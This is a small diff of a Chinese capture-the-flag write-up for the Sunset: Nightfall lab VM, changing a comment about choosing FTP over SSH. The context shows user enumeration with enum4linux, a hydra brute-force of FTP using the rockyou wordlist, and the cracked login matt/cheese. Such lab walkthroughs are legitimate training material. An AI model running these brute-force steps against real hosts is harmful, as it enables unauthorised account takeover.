@@ -35,13 +35,13 @@ enum4linux -a 192.168.56.104
 > **得到两个用户 ‘nightfall’ 和 ‘matt’ ，接下来我们进行暴力破解**
 
 ```
-#SSH破解很长时间无效果，FTP破解很快就出来了
 hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -e nsr 192.168.56.104 ftp -f
 ```
 
 ![](./img/Sunset：Nightfall-05.png)
 
 ```
+#尝试SSH登录失败,老老实实登录FTP
 ftp 192.168.56.104
 username:matt
 password:cheese
